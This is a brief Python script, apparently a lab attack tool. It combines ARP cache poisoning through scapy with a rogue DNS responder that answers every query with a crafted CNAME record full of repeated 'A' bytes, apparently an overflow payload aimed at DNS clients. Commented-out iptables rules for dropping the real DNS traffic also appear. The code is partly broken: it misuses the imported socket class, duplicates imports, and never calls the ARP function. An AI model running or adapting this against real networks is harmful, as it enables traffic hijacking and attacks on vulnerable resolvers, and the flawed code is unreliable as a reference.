from binascii import hexlify, unhexlify
from socket import AF_INET, SOCK_DGRAM, socket
from struct import unpack
from scapy.all import *
from multiprocessing import Process
from binascii import hexlify, unhexlify
import argparse, time, os

sock = socket.socket(AF_INET, SOCK_DGRAM)
sock.bind(('0.0.0.0', 53))

def ARPP(target, dns_server):
    print("[*] Sending poisoned ARP packets")
    target_mac = getmacbyip(target)
    dns_server_mac = getmacbyip(dns_server)
    time.sleep(2)
    send(ARP(op=2, pdst=target, psrc=dns_server, hwdst=target_mac),verbose = 0)
    send(ARP(op=2, pdst=dns_server, psrc=target, hwdst=dns_server_mac),verbose = 0)

print("starting iptables command")

#os.system("iptables -A FORWARD -p UDP -d 172.20.0.4 --dport 53 -j DROP")
#os.system("iptables -A FORWARD -p UDP -s 172.20.0.50 --dport 53 -j DROP")

while True:
    request, addr = sock.recvfrom(4096)
    print(b'<<< '+hexlify(request))
    ident = request[0:2]
    # find request
    nullptr = request.find(0x0,12)
    reqname = request[12:request.find(0x0,12)+1]
    reqtype = request[nullptr+1:nullptr+3]
    reqclass = request[nullptr+3:nullptr+5]
    print('name: %s, type: %s, class: %s' % (reqname, unpack('>H', reqtype), unpack('>H', reqclass)))
    # CNAME response
    response = request[0:2] + \
               unhexlify('''81800001000100000000''') + \
               reqname + reqtype + reqclass + \
               unhexlify('c00c0005000100000e10000b18414141414141414141414141414141414141414141414141c004')
    print(b'>>> '+hexlify(response))
    sock.sendto(bytes(response), addr)